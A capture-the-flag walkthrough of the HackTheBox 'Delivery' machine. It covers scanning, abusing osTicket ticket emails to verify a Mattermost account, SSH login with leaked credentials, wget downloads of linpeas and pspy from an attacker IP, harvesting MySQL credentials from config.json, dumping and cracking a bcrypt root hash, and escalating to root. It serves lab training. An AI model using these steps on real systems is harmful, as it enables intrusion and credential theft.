# Delivery - Easy

```sh
sudo vim /etc/hosts
# add delivery.htb

nmap -T4 -p- -A -Pn -v delivery.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.9p1 Debian 10+deb10u2
    * 80/tcp - http - nginx 1.14.2
    * 8065/tcp - http - Golang net/http server

* webpage on port 80 is for email-related support and it gives the domain 'helpdesk.delivery.htb' - update the ```/etc/hosts``` entry with this subdomain

* the webpage also mentions the Mattermost server running on port 8065, and that it can be accessed with a '@delivery.htb' email address

* web scan:

    ```sh
    gobuster dir -u http://delivery.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # dir scan of main page

    ffuf -c -u "http://delivery.htb" -H "Host: FUZZ.delivery.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 1,486 -s
    # subdomain scan
    # filtered responses with multiple word sizes to avoid false positives of empty pages
    ```

* the 'helpdesk.delivery.htb' subdomain is running an instance of osTicket, a ticketing system for the support center

* we have access to osTicket as a guest user, and have the option to sign in as well

* as a guest user, we have options to open a new ticket and check ticket status

* clicking on 'sign in' provides two approaches - signing in as a client at 'http://helpdesk.delivery.htb/login.php', or signing in as an agent at 'http://helpdesk.delivery.htb/scp/login.php' - the latter leads to a different interface as it is for SCP (staff control panel)

* the normal sign in page also provides an option to register a new account

* similarly, the Mattermost page on port 8065 also has an option to create a new account or login with existing account

* the option to create a new account does not work as intended, since it sends a verification email to verify the account creation

* the same issue is faced during the account registration on osTicket - as this also requires verifying the email address

* we can attempt to create a new ticket at 'http://helpdesk.delivery.htb/open.php' - the ticket can be created without using an account and we get a ticket ID

* it also mentions that if more info is to be added to the ticket, we can email '<ticket-id>@delivery.htb' - the ticket ID is a 7-digit randomly generated number

* now, it is likely that the ticket gets auto-updated whenever an email is sent to the corresponding ticket ID email account

* we can use this to register a new account at Mattermost on port 8065, as the activation email will refer the ticket ID and the case notes/status should get updated

* to check this, we can create a new ticket with a test email ID like 'test@test.htb', and once the ticket is created, we get the auto-generated email '2046999@delivery.htb'

* in the Mattermost webpage, we can select the option to create a new account, and fill in the email address as '2046999@delivery.htb' and give test creds like 'tester:Password123!'

* when we click on 'Create Account', Mattermost mentions a verification email has been sent to the inbox

* we can check this by navigating back to osTicket guest page and clicking on 'Check Ticket Status' - here we can give the email and ticket ID for the ticket created earlier

* checking the ticket status thread, we can see the registration email with the verification link, in the format 'http://delivery.htb:8065/do_verify_email?token=<random>&email=2046999@delivery.htb'

* we can paste this verification link in a new tab, and this verifies the email - now we can log into Mattermost

* the page provides an option to join an 'Internal' team - the chat is accessible now and it gives us the following info:

    * creds to the server are 'maildeliverer:Youve_G0t_Mail!'
    * the team is re-using passwords which are a variant of "PleaseSubscribe!"

* we can attempt to login via SSH as 'maildeliverer':

    ```sh
    ssh maildeliverer@delivery.htb
    # this works

    cat user.txt
    # user flag
    
    sudo -l
    # not available

    # we can attempt enum using linpeas - fetch script from attacker

    wget http://10.10.14.23:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.19.0-13-amd64, Debian GNU/Linux 10
    * sudo version 1.8.27
    * suggested exploits include CVE-2021-4034 & CVE-2019-13272 (the latter requires an active polkit agent)
    * cronjob running every minute for script ```/root/mail.sh```
    * ptrace protection is disabled

* we do not have access to ```/root/mail.sh``` so the cronjob privesc vector is ruled out

* we can attempt [CVE-2019-13272](https://github.com/jas502n/CVE-2019-13272) but the exploit fails as there's no active PolKit agent

* we can try checking for any background processes/jobs using ```pspy```:

    ```sh
    wget http://10.10.14.23:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` does not give anything so we need to enumerate further

* we can enumerate the web directories and the mattermost install:

    ```sh
    ls -la /var/www
    # enumerate the webpages

    ls -la /var/www/osticket
    # check the osticket pages

    ls -la /opt/mattermost
    # check the mattermost install

    ls -la /opt/mattermost/config
    # review config files

    cat /opt/mattermost/config/config.json
    # check mattermost config
    ```

* in the mattermost 'config.json' file, under the config for 'SQLSettings', we can see the data source include the creds 'mmuser:Crack_The_MM_Admin_PW' used for the MySQL connection

* using these creds, we can check the SQL DB now:

    ```sh
    mysql -u mmuser -p

    show databases;
    # has mattermost DB

    use mattermost;

    show tables;
    # this gives many tables
    # we can check the users table

    select * from Users;
    ```

* from the 'Users' table, we get the hashes for several email addresses; however, 'root@delivery.htb' stands out as it could be for the 'root' user

* hash identifiers tools indicate that this is a bcrypt hash (ensure to copy the correct hash from the data dump), supported by mode 3200 in ```hashcat```

* we can attempt to crack this hash - we can use the hint given in the Mattermost chat earlier about passwords being a variation of the string "PleaseSubscribe!" to generate a wordlist with a strong rule like 'best64':

    ```sh
    vim roothash

    echo 'PleaseSubscribe!' > pleasesubscribe.txt
    # store string in file - we need to use the rule on this

    hashcat -a 0 -m 3200 roothash pleasesubscribe.txt -r /usr/share/hashcat/rules/best64.rule --force
    ```

* ```hashcat``` cracks the password 'PleaseSubscribe!21' - we can use this to login as 'root' now:

    ```sh
    su root
    # this works

    cat /root/root.txt
    # root flag
    ```
